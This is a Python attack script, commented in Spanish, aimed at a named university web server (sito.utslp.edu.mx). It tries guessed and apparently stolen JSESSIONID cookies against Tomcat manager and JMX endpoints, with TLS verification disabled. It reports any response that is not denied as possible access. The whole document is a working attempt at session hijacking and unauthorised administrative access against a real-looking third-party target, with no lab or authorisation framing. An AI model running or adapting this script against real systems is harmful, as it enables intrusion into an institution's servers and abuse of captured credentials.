import requests
import itertools

def exploit_tomcat_session():
    target = "https://sito.utslp.edu.mx"
    
    # Probar sesiones secuenciales y patrones comunes
    test_sessions = [
        "00000000000000000000000000000000",  # Ya confirmado
        "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF",  # Patrón máximo
        "0123456789ABCDEF0123456789ABCDEF",  # Secuencial
        "5AC92EC7B819B3474841A747FF58C063",  # De tu cookies.txt
    ]
    
    for jsessionid in test_sessions:
        print(f"Probando: {jsessionid}")
        
        # Probar diferentes endpoints con esta sesión
        endpoints = [
            "/manager/html",
            "/jsp/",
            "/examples/jsp/",
            "/manager/list",
            "/manager/jmxproxy"
        ]
        
        for endpoint in endpoints:
            r = requests.get(
                f"{target}{endpoint}",
                cookies={'JSESSIONID': jsessionid},
                verify=False,
                timeout=10
            )
            
            if r.status_code != 401 and r.status_code != 403:
                print(f"  ✅ {endpoint} - Status: {r.status_code}")
                if "tomcat" in r.text.lower() or "manager" in r.text.lower():
                    print(f"  ⚡ POSIBLE ACCESO: {endpoint}")
            else:
                print(f"  ❌ {endpoint} - Denegado")
